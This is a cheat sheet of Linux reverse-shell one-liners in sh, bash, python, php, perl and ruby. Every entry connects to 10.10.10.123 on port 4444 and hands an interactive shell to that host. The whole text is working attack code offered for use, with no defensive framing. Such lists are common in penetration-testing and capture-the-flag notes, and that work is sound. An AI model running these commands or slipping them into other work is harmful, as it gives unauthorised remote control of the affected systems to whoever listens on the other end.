# Linux reverse shells

## sh
Works on Linux and FreeBSD/NetBSD.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.123 4444 >/tmp/f
```

## bash
```bash
bash -i >& /dev/tcp/10.10.10.123/4444 0>&1
``` 

## python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php
```php
# One liner
php -r '$sock=fsockopen("10.10.10.123",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Reverse shell in file
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.123/4444 0>&1'");
```

## perl
```perl
perl -e 'use Socket;$i="10.10.10.123";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.123",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

